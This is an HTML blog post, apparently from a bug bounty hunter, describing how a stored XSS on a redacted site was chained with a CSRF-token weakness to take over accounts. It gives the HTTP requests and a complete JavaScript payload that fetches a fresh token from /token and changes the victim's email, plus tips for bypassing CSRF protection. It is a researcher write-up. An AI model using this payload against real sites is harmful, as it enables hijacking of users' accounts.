@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="description" content="When doing a Bug Hunting and finding a Stored XSS bug, usually the imagination will get a big enough bounty has been spinning around on the head. But sometim...">
+  <meta name="keywords" content="bug hunting, bug hunter, pentest, penetration testing, and hacking">
+  <meta name="author" content="XSS to Account Takeover - Bypassing CSRF Header Protection and HTTPOnly Cookie | Noobe.io">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="theme-color" content="#f5f5f5">
+  <meta name="google-site-verification" content="ovHMjnPbV77CCgMqbuScCfGjNhvMThbOFTHcHtuURHo" />
+
+  <!-- Twitter Tags -->
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="XSS to Account Takeover - Bypassing CSRF Header Protection and HTTPOnly Cookie | Noobe.io">
+  <meta name="twitter:description" content="When doing a Bug Hunting and finding a Stored XSS bug, usually the imagination will get a big enough bounty has been spinning around on the head. But sometim...">
+  
+  <meta property="twitter:image" content="http://localhost:4000/img/5d02f144bca472117661e342a29bf504-f.png">
+  
+
+  <!-- Open Graph Tags -->
+  <meta property="og:type" content="blog">
+  <meta property="og:url" content="http://localhost:4000/articles/2019-10/xss-to-account-takeover">
+  <meta property="og:title" content="XSS to Account Takeover - Bypassing CSRF Header Protection and HTTPOnly Cookie | Noobe.io">
+  <meta property="og:description" content="When doing a Bug Hunting and finding a Stored XSS bug, usually the imagination will get a big enough bounty has been spinning around on the head. But sometim...">
+  
+  <meta property="og:image" content="http://localhost:4000/img/5d02f144bca472117661e342a29bf504-f.png">
+  
+  <title>XSS to Account Takeover - Bypassing CSRF Header Protection and HTTPOnly Cookie | Noobe.io</title>
+
+  <!-- CSS files -->
+  <link rel="stylesheet" href="http://localhost:4000/css/font-awesome.min.css">
+  <link rel="stylesheet" href="http://localhost:4000/css/main.css">
+
+  <link rel="canonical" href="http://localhost:4000/articles/2019-10/xss-to-account-takeover">
+  <link rel="alternate" type="application/rss+xml" title="Noobe.io" href="http://localhost:4000/feed.xml" />
+
+  <!-- Icons -->
+  <!-- 16x16 -->
+  <link rel="shortcut icon" href="http://localhost:4000/img/noobe-favicon.png">
+  <!-- 32x32 -->
+  <link rel="shortcut icon" href="http://localhost:4000/img/noobe-favicon.png">
+  <link rel="stylesheet" type="text/css" href="http://localhost:4000/css/cookieconsent.min.css"/>
+</head>
+
+
+<body>
+  <div class="row">
+    <div class="col s12 m3">
+      <div class="table cover">
+        
+
+<div class="cover-card table-cell table-middle">
+  
+  <a href="http://localhost:4000/">
+    <img src="http://localhost:4000/img/noobe-logo.png" alt="" class="avatar">
+  </a>
+  
+  <a href="http://localhost:4000/" class="author_name">noobe.io</a>
+  <span class="author_job">Pentester • Bug Hunter • Security Enthusiast</span>
+  <span class="author_bio mbm">Just another noob post.</span>
+  <nav class="nav">
+    <ul class="nav-list">
+      <li class="nav-item">
+        <a href="http://localhost:4000/">home</a>
+      </li>
+       
+      <li class="nav-item">
+        <a href="http://localhost:4000/archive/">Archive</a>
+      </li>
+        
+      <li class="nav-item">
+        <a href="http://localhost:4000/cookie-policy/">Cookie Policy</a>
+      </li>
+          
+      <li class="nav-item">
+        <a href="http://localhost:4000/categories/">Categories</a>
+      </li>
+            
+      <li class="nav-item">
+        <a href="http://localhost:4000/tags/">Tags</a>
+      </li>
+         
+    </ul>
+  </nav>
+  <script type="text/javascript">
+  // based on http://stackoverflow.com/a/10300743/280842
+  function gen_mail_to_link(hs, subject) {
+    var lhs,rhs;
+    var p = hs.split('@');
+    lhs = p[0];
+    rhs = p[1];
+    document.write("<a class=\"social-link-item\" target=\"_blank\" href=\"mailto");
+    document.write(":" + lhs + "@");
+    document.write(rhs + "?subject=" + subject + "\"><i class=\"fa fa-fw fa-envelope\"></i><\/a>");
+  }
+</script>
+<div class="social-links">
+  <ul>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+  </ul>
+</div>
+
+</div>
+
+      </div>
+    </div>
+    <div class="col s12 m9">
+      <div class="post-listing">
+        <a class="btn" href= "http://localhost:4000/" >
+  Home
+</a>
+
+<div id="post">
+  <header class="post-header">
+    <h1 title="XSS to Account Takeover - Bypassing CSRF Header Protection and HTTPOnly Cookie">XSS to Account Takeover - Bypassing CSRF Header Protection and HTTPOnly Cookie</h1>
+    <span class="post-meta">
+      <span class="post-date">
+        29 OCT 2019
+      </span>
+      •
+      <span class="read-time" title="Estimated read time">
+  
+  
+    6 mins read
+  
+</span>
+
+    </span>
+
+  </header>
+
+  <article class="post-content">
+    <p>بسم الله الرحمن الرحيم</p>
+
+<p>When doing a Bug Hunting and finding a Stored XSS bug, usually the imagination will get a big enough bounty has been spinning around on the head. But sometimes the imagination fades when we try to insert document.cookie into the XSS payload and what appears is:</p>
+
+<p><img src="/assets/5d02f144bca472117661e342a29bf504-1.png" alt="Blank Cookie" /></p>
+
+<p>Popup alerts are expected to display cookies from the target website but instead display nothing because <em>the cookies on the website are set HTTPOnly so that they cannot be accessed by javascript</em>.</p>
+
+<p>When you find something like this, usually the next option is to make a request using <strong>XHR</strong> to ‘force’ users to take sensitive actions without their knowledge. For example, changing passwords or changing email addresses.</p>
+
+<p>And when will do that, requests are sent as follows:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /user/changeEmail HTTP/1.1
+Host: redacted.com
+Connection: close
+Content-Length: 84
+Sec-Fetch-Mode: cors
+csrf-token: 3005c34f-4cea-4470-afe8-045f1c14a2af
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
+Content-Type: application/json; charset=UTF-8
+Accept: */*
+Sec-Fetch-Site: same-origin
+Accept-Encoding: gzip, deflate
+Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,eu;q=0.6
+Cookie: JSESSIONID=_zo6sV5qYkxhYwSCULJ4KRzOqP3G_-xVma2rKVPo; csrf-token=3005c34f-4cea-4470-afe8-045f1c14a2af;
+
+{"email":"pwn@1337.com"}
+</code></pre></div></div>
+
+<p>Seen in the request header there is a <code class="language-plaintext highlighter-rouge">csrf</code> token that aims to prevent <strong>CSRF</strong> attacks. So the exploitation process becomes more difficult because there is a <strong>CSRF</strong> header that changes every time a request is made.</p>
+
+<p>When viewed closely, the request header and cookie have <code class="language-plaintext highlighter-rouge">csrf-tokens</code> with the same value. So I tried to change the two values into another value, but still the same.</p>
+
+<p>Request:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /user/changeEmail HTTP/1.1
+Host: redacted.com
+Connection: close
+Content-Length: 84
+Sec-Fetch-Mode: cors
+csrf-token: asu
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
+Content-Type: application/json; charset=UTF-8
+Accept: */*
+Sec-Fetch-Site: same-origin
+Accept-Encoding: gzip, deflate
+Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,eu;q=0.6
+Cookie: JSESSIONID=_zo6sV5qYkxhYwSCULJ4KRzOqP3G_-xVma2rKVPo; csrf-token=asu;
+
+{"email":"pwn@1337.com"}
+</code></pre></div></div>
+
+<p>Response:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{"changingEmailCompleted":true}
+</code></pre></div></div>
+
+<p>Boom! It turned out that the email was successfully changed using this method. This means we can manipulate the <code class="language-plaintext highlighter-rouge">csrf-token</code> in the header to anything as long as the value is the same as the <code class="language-plaintext highlighter-rouge">csrf-token</code> in the cookie.</p>
+
+<p>Since we cannot access cookies, I have tried adding new cookies using the following script:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="o">=</span><span class="dl">"</span><span class="s2">csrf-token=asu</span><span class="dl">"</span><span class="p">;</span><span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<p>When trying to make a request, the response is as follows:</p>
+
+<p><img src="/assets/5d02f144bca472117661e342a29bf504-2.png" alt="CSRF Detected" /></p>
+
+<p>Why does the <code class="language-plaintext highlighter-rouge">Possible CSRF attack detected</code> message appear ?</p>
+
+<p>When rechecking is done, the request turns out to be like this:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /user/changeEmail HTTP/1.1
+Host: redacted.com
+Connection: close
+Content-Length: 84
+Sec-Fetch-Mode: cors
+csrf-token: asu
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
+Content-Type: application/json; charset=UTF-8
+Accept: */*
+Sec-Fetch-Site: same-origin
+Accept-Encoding: gzip, deflate
+Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,eu;q=0.6
+Cookie: csrf-token=asu; JSESSIONID=_zo6sV5qYkxhYwSCULJ4KRzOqP3G_-xVma2rKVPo; csrf-token=0b84028f-35de-4bd6-bf72-a0a776a7b3f2;
+
+{"email":"pwn@1337.com"}
+</code></pre></div></div>
+
+<p>There appear 2 cookies named <code class="language-plaintext highlighter-rouge">csrf-token</code>, this seems to be the cause of the error earlier.</p>
+
+<p>Since we don’t do anything to the cookies, all we can use here is <code class="language-plaintext highlighter-rouge">csrf-token</code> in the request header. But of course we must get a valid value.</p>
+
+<p>This website is built using AngularJS, there is no <code class="language-plaintext highlighter-rouge">csrf-token</code> value stored in the HTML code, and the value of the <code class="language-plaintext highlighter-rouge">cookie</code> changes with every request.</p>
+
+<p>Wait, <code class="language-plaintext highlighter-rouge">always changing every request?</code> This means that there are times when the server sends a new <code class="language-plaintext highlighter-rouge">cookie</code> to the browser. So I tried to find out when that moment happened.</p>
+
+<p>Then a background request is found to the endpoint <code class="language-plaintext highlighter-rouge">/token</code> as follows:</p>
+
+<p>Request:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /token HTTP/1.1
+Host: redacted.com
+Connection: close
+Content-Length: 84
+Sec-Fetch-Mode: cors
+csrf-token: 0b84028f-35de-4bd6-bf72-a0a776a7b3f2
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
+Content-Type: application/json; charset=UTF-8
+Accept: */*
+Sec-Fetch-Site: same-origin
+Accept-Encoding: gzip, deflate
+Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,eu;q=0.6
+Cookie: JSESSIONID=_zo6sV5qYkxhYwSCULJ4KRzOqP3G_-xVma2rKVPo; csrf-token=0b84028f-35de-4bd6-bf72-a0a776a7b3f2;
+</code></pre></div></div>
+
+<p>Response:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
+Content-Type: application/json;charset=UTF-8
+Connection: close
+Date: Fri, 04 Oct 2019 15:08:38 GMT
+Server: nginx
+Expires: Thu, 01 Jan 1970 00:00:00 GMT
+Cache-Control: no-cache, no-store, must-revalidate
+Set-Cookie: csrf-token=725d97de-550d-4644-9579-d4b3e1209ded; path=/; secure; HttpOnly
+X-XSS-Protection: 1; mode=block
+Pragma: no-cache
+csrf-token: 725d97de-550d-4644-9579-d4b3e1209ded
+Content-Security-Policy: frame-ancestors 'self'
+X-Content-Type-Options: nosniff
+[...]
+</code></pre></div></div>
+
+<p>It can be seen that when making a request to endpoint <code class="language-plaintext highlighter-rouge">/token</code>, the server responds by giving a new <code class="language-plaintext highlighter-rouge">csrf-token</code> cookie. Then we can use this request to retrieve the <code class="language-plaintext highlighter-rouge">csrf-token</code>, using a script like the following:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+<span class="kd">var</span> <span class="nx">method</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">GET</span><span class="dl">'</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">https://redacted.com/token</span><span class="dl">'</span><span class="p">;</span>
+<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="nx">method</span><span class="p">,</span><span class="nx">url</span><span class="p">,</span><span class="kc">true</span><span class="p">);</span>
+<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
+
+<span class="nx">xhr</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span>
+<span class="p">{</span>
+ <span class="kd">var</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">xhr</span><span class="p">.</span><span class="nx">getResponseHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">csrf-token</span><span class="dl">'</span><span class="p">);</span>
+ <span class="nx">alert</span><span class="p">(</span><span class="nx">token</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>And the <strong>CSRF Token</strong> was successfully obtained!</p>
+
+<p><img src="/assets/5d02f144bca472117661e342a29bf504-3.png" alt="CSRF Token" /></p>
+
+<p>Finally, just combine it with the request to change the email earlier.</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+<span class="kd">var</span> <span class="nx">method</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">GET</span><span class="dl">'</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">https://redacted.com/token</span><span class="dl">'</span><span class="p">;</span>
+<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="nx">method</span><span class="p">,</span><span class="nx">url</span><span class="p">,</span><span class="kc">true</span><span class="p">);</span>
+<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
+
+<span class="nx">xhr</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span>
+<span class="p">{</span>
+ <span class="kd">var</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">xhr</span><span class="p">.</span><span class="nx">getResponseHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">csrf-token</span><span class="dl">'</span><span class="p">);</span> <span class="c1">// ngambil token dari response header</span>
+
+ <span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">https://redacted.com/user/changeEmail</span><span class="dl">"</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+ <span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span><span class="o">=</span><span class="dl">"</span><span class="s2">true</span><span class="dl">"</span><span class="p">;</span>
+ <span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">csrf-token</span><span class="dl">"</span><span class="p">,</span> <span class="nx">token</span><span class="p">);</span>
+ <span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Content-type</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">application/json; charset=UTF-8</span><span class="dl">"</span><span class="p">);</span>
+ <span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">{"email":"pwn@1337.com"}</span><span class="dl">'</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="nx">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">Ups, You</span><span class="se">\'</span><span class="s1">re pwned!</span><span class="dl">'</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>And the email address was successfully changed.</p>
+
+<p><img src="/assets/5d02f144bca472117661e342a29bf504-4.png" alt="Pwn" /></p>
+
+<h4 id="conclusion">Conclusion</h4>
+
+<ul>
+  <li>When finding a Stored XSS but cannot get a cookie, don’t report it immediately because it is likely that the severity will decrease.</li>
+  <li>Try to do chaining with other bugs, CSRF for example to perform sensitive actions</li>
+  <li>When finding CSRF Protection, try to delete it or change its value to null, sometimes something magical can work.</li>
+  <li>Look for other endpoints that can be used to obtain a valid CSRF Token.</li>
+</ul>
+
+  </article>
+</div>
+
+<div class="share-buttons">
+  <h6>Share on: </h6>
+  <ul>
+    <li>
+      <a href="https://twitter.com/intent/tweet?text=http://localhost:4000/articles/2019-10/xss-to-account-takeover" class="twitter btn" title="Share on Twitter"><i class="fa fa-twitter"></i><span> Twitter</span></a>
+    </li>
+    <li>
+      <a href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/articles/2019-10/xss-to-account-takeover" class="facebook btn" title="Share on Facebook"><i class="fa fa-facebook"></i><span> Facebook</span></a>
+    </li>
+    <li>
+      <a href="https://plus.google.com/share?url=http://localhost:4000/articles/2019-10/xss-to-account-takeover" class="google-plus btn" title="Share on Google Plus"><i class="fa fa-google-plus"></i><span> Google+</span></a>
+    </li>
+    <li>
+      <a href="https://news.ycombinator.com/submitlink?u=http://localhost:4000/articles/2019-10/xss-to-account-takeover" class="hacker-news btn" title="Share on Hacker News"><i class="fa fa-hacker-news"></i><span> Hacker News</span></a>
+    </li>
+    <li>
+      <a href="https://www.reddit.com/submit?url=http://localhost:4000/articles/2019-10/xss-to-account-takeover" class="reddit btn" title="Share on Reddit"><i class="fa fa-reddit"></i><span> Reddit</span></a>
+    </li>
+  </ul>
+</div><!-- end share-buttons -->
+
+
+<div id="disqus_thread"></div>
+<script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES * * */
+    var disqus_shortname = 'noobe';
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+
+
+        <footer>
+  &copy; 2020 Noobe.io. Powered by <a href="http://jekyllrb.com/">Jekyll</a>, <a href="http://github.com/renyuanz/leonids/">leonids theme</a> made with <i class="fa fa-heart heart-icon"></i>
+</footer>
+
+      </div>
+    </div>
+  </div>
+  <script type="text/javascript" src="http://localhost:4000/js/jquery-3.2.1.min.js"></script>
+<script type="text/javascript" src="http://localhost:4000/js/main.js"></script>
+<script src="http://localhost:4000/js/cookieconsent.min.js"></script>
+<script>
+      window.addEventListener("load", function(){window.wpcc.init({"border":"thin","corners":"small","colors":{"popup":{"background":"#f0edff","text":"#000000","border":"#5e65c2"},"button":{"background":"#5e65c2","text":"#ffffff"}},"position":"bottom","fontsize":"small","content":{"href":"http://noobe.io/cookie-policy/"}})});
+</script>
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-156423500-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-156423500-1');
+</script>
+
+
+
+</body>
+</html>
